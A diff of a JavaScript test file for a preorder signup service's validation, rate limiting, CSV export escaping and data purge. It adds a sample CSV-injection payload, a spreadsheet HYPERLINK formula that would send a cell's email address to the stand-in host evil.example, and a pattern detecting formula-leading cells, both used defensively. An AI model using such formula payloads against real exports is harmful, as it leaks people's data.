@@ -5,7 +5,7 @@ import assert from "node:assert/strict";
 import { generateKeyPairSync } from "node:crypto";
 import worker from "./src/index.js";
 import { fakeStats } from "./fake_stats.mjs";
-import { PRE, preEmail } from "./src/preorder.js";
+import { PRE, preEmail, preId } from "./src/preorder.js";
 import { _forgetIpLimits } from "./src/iplimit.js";
 
 const kv = new Map();
@@ -66,8 +66,29 @@ assert.deepEqual(Object.keys(rows()[1]).sort(), ["at", "email", "id", "lang", "p
 assert.deepEqual([rows()[1].plan, rows()[1].lang], ["undecided", "en"]);
 assert.equal(preEmail("x@y.z"), null);
 
-// per address: 5 an hour
+// addresses: real ones (with + and dots) pass; nothing a spreadsheet would run as a formula, no quote, comma or space,
+// no non-ASCII. The first version took the HYPERLINK one: opened in Excel or Sheets it sends cell A2 (an address) away.
+const FORMULA = '=hyperlink("http://evil.example/?"&a2&"@a.bc","x")';
+for (const ok of ["first.last+tag@sub.example.co.kr", "user_1@naver.com", "1234@daum.net", "o'brien@example.ie", "a-b@my-site.example", "x@example.xn--3e0b707e"])
+  assert.equal(preEmail(ok), ok, ok);
+assert.equal(preEmail("  First.Last+Tag@Gmail.COM "), "first.last+tag@gmail.com");
+for (const bad of [FORMULA, "=cmd@example.com", "+1@example.com", "-x@example.com", "@a@example.com", '"a"@example.com', "a,b@example.com",
+                   "a b@example.com", "홍길동@example.com", "a@例え.jp", "a@example.c", "a@-x.com", "a@x-.com", "a@example.123", ".a@example.com", "a@example"])
+  assert.equal(preEmail(bad), null, bad);
+r = await pre({ email: FORMULA, consent: true });
+assert.deepEqual([r.http, r.error], [400, "email"]);
+assert.equal(rows().length, 2, "a refused address writes nothing");
+
+// per address: 5 an hour. A body over PRE.body bytes is refused unread (413) and does not count; a body that is not a
+// JSON object is a consent error, as before.
 _forgetIpLimits();
+const bigBody = JSON.stringify({ email: "big@example.com", consent: true, pad: "x".repeat(1 << 20) });
+let big = await call("/preorder", { method: "POST", headers: { "Content-Type": "application/json" }, body: bigBody }, "10.8.8.8");
+assert.deepEqual([big.status, (await big.json()).error, big.headers.get("access-control-allow-origin")], [413, "body", "*"]);
+big = await call("/preorder", { method: "POST", headers: { "Content-Type": "application/json", "Content-Length": String(PRE.body + 1) }, body: "{}" }, "10.8.8.8");
+assert.equal(big.status, 413, "a Content-Length over the limit is refused unread");
+assert.equal((await call("/preorder", { method: "POST", body: "null" }, "10.8.8.8")).status, 400);
+assert.equal(rows().length, 2);
 for (let i = 0; i < 5; i++) assert.equal((await pre({ email: `ip${i}@example.com`, consent: true }, "10.8.8.8")).ok, true);
 r = await pre({ email: "ip6@example.com", consent: true }, "10.8.8.8");
 assert.deepEqual([r.http, r.error], [429, "busy"]);
@@ -99,13 +120,15 @@ _forgetIpLimits();
 await pre({ email: "late@example.com", plan: "biz", consent: true });
 assert.equal((await adm("/preorders")).fresh, 1);
 
-// export: every email as CSV, logged; formula-looking cells are quoted
-await pre({ email: "=cmd@example.com", consent: true });
+// export: every email as CSV, logged. A row the first version may have taken (put straight into the table here) that a
+// spreadsheet would run as a formula gets a ' in front, inside its quotes: quotes alone do not stop Excel or Sheets.
+st.db.prepare("INSERT INTO preorders (id, email, plan, lang, at) VALUES (?, ?, ?, ?, ?)").run(await preId(FORMULA), FORMULA, "free", "en", Date.now());
 const ex = await adm("/preorders/export", {});
 assert.equal(ex.count, 9);
 assert.match(ex.csv, /^email,plan,lang,at\r\n/);
 assert.match(ex.csv, /\r\nfan@example\.com,ultra,ko,2026-11-20T03:00:00\.000Z\r\n/);
-assert.match(ex.csv, /"=cmd@example\.com"/);
+assert.ok(ex.csv.includes('\r\n"\'=hyperlink(""http://evil.example/?""&a2&""@a.bc"",""x"")",free,en,2026-11-20T04:00:00.000Z'), "the formula is text");
+assert.ok(!/(^|\r\n|,)"?[=+\-@\t\r]/.test(ex.csv), "no cell starts with = + - @");
 const log = st.rows("SELECT action, detail FROM audit_log");
 assert.ok(log.some(x => x.action === "사전예약 내보내기" && x.detail === "9건"));
 assert.ok(!log.some(x => x.detail.includes("@")), "the log names no address");
@@ -117,6 +140,9 @@ assert.deepEqual([(await adm("/preorders/delete", { email: "LATE@example.com" })
 assert.deepEqual([(await adm("/preorders/delete", { email: "late@example.com" })).deleted], [false]);
 assert.equal((await adm("/preorders/delete", { email: "nope" })).http, 400);
 assert.equal(rows().length, 8);
+// a row the first version took is found by the delete too
+assert.deepEqual([(await adm("/preorders/delete", { email: FORMULA })).deleted], [true]);
+assert.equal(rows().length, 7);
 
 // closed after the deadline (and by PREORDER=off); the tab still shows
 Date.now = () => Date.parse("2026-11-27T15:00:00Z");
@@ -124,10 +150,15 @@ assert.equal((await j("/preorder")).open, false);
 r = await pre({ email: "after@example.com", consent: true });
 assert.deepEqual([r.http, r.error], [403, "closed"]);
 const late = await adm("/preorders");
-assert.deepEqual([late.open, late.shown, late.count], [false, true, 8]);
+assert.deepEqual([late.open, late.shown, late.count], [false, true, 7]);
 Date.now = () => Date.parse("2026-11-21T00:00:00Z");
-env.PREORDER = "off";
-assert.equal((await j("/preorder")).open, false);
+for (const off of ["off", "OFF", " Off "]) {   // any case: a switch typed "OFF" must not be ignored
+  env.PREORDER = off;
+  assert.equal((await j("/preorder")).open, false, JSON.stringify(off));
+  assert.deepEqual([(await pre({ email: "off@example.com", consent: true })).error], ["closed"]);
+}
+env.PREORDER = "on";
+assert.equal((await j("/preorder")).open, true);
 delete env.PREORDER;
 env.PREORDER_UNTIL = "2026-11-20T00:00:00Z";
 assert.equal((await j("/preorder")).open, false);
@@ -165,9 +196,12 @@ delete env.PREORDER_UNTIL;
 
 // on 2027-02-28 KST everything is deleted: by the hourly tick and by any call; the tab goes away
 at("2027-02-27T14:59:00Z", () => st.obj.prePurge());
-assert.equal(rows().length, 8, "kept until the day");
-at("2027-02-27T15:00:00Z", () => st.obj.prePurge());   // what the hourly tick runs
-assert.equal(rows().length, 0);
+assert.equal(rows().length, 7, "kept until the day");
+// the hourly tick deletes them before it asks GitHub, so a GitHub that never answers does not hold the deletion up
+globalThis.fetch = () => new Promise(() => {});
+at("2027-02-27T15:00:00Z", () => { st.obj.tick(); });   // not awaited: it waits on GitHub for ever
+assert.equal(rows().length, 0, "deleted by the tick at once");
+globalThis.fetch = async url => assert.fail("no network in this test: " + url);
 Date.now = () => Date.parse("2027-02-27T16:00:00Z");
 const gone = await adm("/preorders");
 assert.deepEqual([gone.count, gone.shown, gone.open], [0, false, false]);
